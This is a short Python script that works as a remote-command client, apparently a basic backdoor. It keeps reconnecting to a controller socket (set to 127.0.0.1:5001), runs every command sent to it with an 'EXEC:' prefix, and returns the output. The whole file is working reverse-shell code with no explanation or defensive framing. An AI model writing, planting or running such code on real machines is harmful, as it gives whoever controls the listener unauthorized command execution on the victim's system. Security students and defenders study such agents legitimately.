#!/bin/python3

import socket
from time import sleep
from subprocess import Popen, PIPE

ADDRESS, PORT = "127.0.0.1", 5001

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while True:
    
    try: 
        client.connect((ADDRESS, PORT))

    except ConnectionRefusedError:
        sleep(5)
        continue

    while True:
        msg = client.recv(1024)
        msg = msg.decode()
        msg = msg.strip()

        if msg == "EXIT": 
            client.shutdown(socket.SHUT_RD)
            client.close()
            sleep(5)
            break

        if msg[:4] == "EXEC": 
            msg = msg.removeprefix("EXEC:")
            command = msg.split(' ')
            process = Popen(command, stdout=PIPE, stderr=PIPE)
            stdout, stderr = process.communicate()
            response = stdout.decode() + stderr.decode() + '\n'
            client.send(b"OK")
            client.send(response.encode())




